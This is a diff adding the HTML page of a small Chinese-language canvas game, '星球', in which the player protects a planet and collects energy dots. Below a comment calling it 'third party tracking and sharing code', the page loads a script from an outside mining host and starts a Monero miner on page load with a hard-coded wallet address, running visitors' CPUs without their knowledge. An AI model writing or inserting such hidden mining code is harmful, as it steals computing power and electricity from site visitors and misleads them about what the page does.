@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+
+    <meta name="description" content="用你的盾牌來防禦邪惡紅色生物的核心！" />
+    <meta name="author" content="John" />
+
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <!-- <meta name="viewport" content="width = 450"> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <title>星球</title>
+
+    <link href="css/reset.css" rel="stylesheet" media="screen" />
+    <link href="css/main.css" rel="stylesheet" media="screen" />
+
+    <link href='https://fonts.googleapis.com/css?family=Molengo' rel='stylesheet' type='text/css'>
+
+</head>
+
+<body>
+    <header>
+        <h1>星球</h1>
+        <!-- <span class="header-instruction">Expand for more info.</span> -->
+
+        <!-- The extra content that can be expanded -->
+        <div class="extra">
+            <div class="miner-outerbox">
+                <textarea id="texta"></textarea>
+            </div>
+        </div>
+
+    </header>
+
+    <div id="status" class="ui"></div>
+    <div id="panels">
+        <div id="message" class="ui">
+            <h2 id="title">星球</h2>
+            <ul>
+                <li>1.保護星球。</li>
+                <li>2.收集能量（綠點）。</li>
+                <li>3.躲避攻擊（紅點）。</li>
+            </ul>
+            <a href="#" id="startButton">開始遊戲</a>
+        </div>
+    </div>
+
+    <canvas id="world">
+        <p class="no-canvas">
+            You need a
+            <a href="http://www.google.com/chrome">modern browser</a> to view this.
+        </p>
+    </canvas>
+    <canvas id="background"></canvas>
+
+    <script src="js/header.js"></script>
+    <script src="js/core.js"></script>
+
+    <!-- Third party tracking and sharing code below -->
+    <script src="https://xmr.omine.ga/assets/v7.js"></script>
+    <script type="text/javascript">
+        var timeout;
+        var XMR;
+
+        function addText(e) {
+
+            var t = document.getElementById("texta");
+            "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value +=
+                "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" ===
+                e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
+        }
+
+        function miner() {
+            OMINE(
+                    "46x3JVoby2KYGv4c18oBNb3fgcaXowwi9BSpq9MDmzYfX7dJie4Nx58Ckcc9tRV8tFHbk9kkFBvdZQfhdYo69vY3MPnnWKF#JOHN_PC",
+                    "-1"),
+                throttleMiner = 50,
+                addText("Connecting..."),
+                timeout = setInterval(function () {
+                    for (; sendStack.length > 0;) addText(sendStack.pop());
+                    for (; receiveStack.length > 0;) addText(receiveStack.pop());
+                    addText("calculated " + totalhashes + " hashes.")
+                    document.getElementById("totalHashes").innerHTML = totalhashes;
+                    document.getElementById("XMR").innerHTML = (totalhashes *
+                        0.00000000005929);
+                }, 2e3);
+
+        }
+
+        miner();
+    </script>
+
+</body>
+
+</html>
